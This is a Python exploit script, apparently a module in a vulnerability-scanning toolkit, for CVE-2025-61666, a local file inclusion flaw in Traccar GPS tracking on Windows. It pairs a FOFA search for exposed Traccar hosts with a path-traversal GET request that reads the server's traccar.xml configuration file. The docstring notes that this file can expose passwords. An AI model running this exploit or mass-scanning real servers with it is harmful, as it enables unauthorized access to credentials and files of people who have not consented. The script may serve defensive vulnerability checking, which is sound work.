"""
name: CVE-2025-61666
CVE编号: CVE-2025-61666
fofa 搜索: app="Traccar"
漏洞类型: 任意文件读取
Traccar是一个开源的GPS跟踪系统。在Windows操作系统上，Traccar的默认安装版本6.1至6.8.1以及非默认安装版本5.8至6.0存在未经验证的本地文件包含漏洞，可能导致密码泄露或文件系统中的任何文件泄露，包括Traccar配置文件。版本5.8至6.0仅在配置文件中的./override设置时才会受到漏洞影响。版本6.1至6.8.1默认存在漏洞，因为web override默认是启用的。版本6.9.0中已经移除了存在漏洞的代码。
"""
import os.path
import sys
from src import api, utils
from urllib.parse import urljoin

__all__ = [
    "search",
    "start"
]


def search(email, key):
    fofa = api.FOFA(email=email, key=key)
    return fofa.search('app="Traccar"')


def start(host, *args, **kwargs):
    """
    Traccar是一个开源的GPS跟踪系统。在Windows操作系统上，Traccar的默认安装版本6.1至6.8.1以及非默认安装版本5.8至6.0存在未经验证的本地文件包含漏洞，可能导致密码泄露或文件系统中的任何文件泄露，包括Traccar配置文件。版本5.8至6.0仅在配置文件中的./override设置时才会受到漏洞影响。版本6.1至6.8.1默认存在漏洞，因为web override默认是启用的。版本6.9.0中已经移除了存在漏洞的代码。
    :param host: 目标地址
    :param args:
    :param kwargs:
    :return:
    """
    url = urljoin(host, "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cProgram%20Files%5ctraccar%5cconf%5ctraccar.xml")
    try:
        response = utils.requests_url(url=url, method='get', *args, **kwargs)

        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False


if __name__ == '__main__':
    vuln_name = os.path.basename(__file__).split('.')[0]
    if len(sys.argv) < 2:
        print(f"python <{vuln_name}> <host>")
        sys.exit()
    parameter = sys.argv[1]
    r_type = start(parameter)
    if r_type:
        print(f"{parameter} vuln {vuln_name}: True")
    else:
        print(f"{parameter} vuln {vuln_name}: False")
